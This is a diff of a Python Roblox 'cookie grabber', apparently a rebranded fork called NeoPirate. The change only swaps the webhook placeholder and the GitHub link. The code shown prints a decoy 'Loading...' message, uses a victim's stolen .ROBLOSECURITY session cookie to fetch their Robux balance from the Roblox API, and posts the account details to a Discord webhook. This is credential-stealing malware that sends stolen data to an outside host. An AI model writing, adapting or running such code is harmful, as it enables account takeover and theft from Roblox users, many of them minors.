@@ -14,7 +14,7 @@ import requests
 import robloxpy
 
 
-webhook_url = 'WEBHOOOOOOOOOOOK'
+webhook_url = 'W E B H O O K'
 
 dummy_message = "Loading..."
 print(dummy_message)
@@ -190,7 +190,6 @@ if __name__ == "__main__":
     username = info['name']
     robux = requests.get(f"https://economy.roblox.com/v1/users/{roblox_id}/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
     premium_status = True if infop == "True" else False
-
     discord = Discord(url=webhook_url)
     discord.post(
         username="BOT - NeoPirate 🍪",
@@ -199,7 +198,7 @@ if __name__ == "__main__":
             {
                 "title": "💸 +1 Result Account 🕯️",
                 "thumbnail": {"url": headshot},
-                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+                "description": f"[Github Page](https://github.com/xyzofc/NeoPirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                 "fields": [
                     {"name": "Username", "value": f"```{username}```", "inline": True},
                     {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
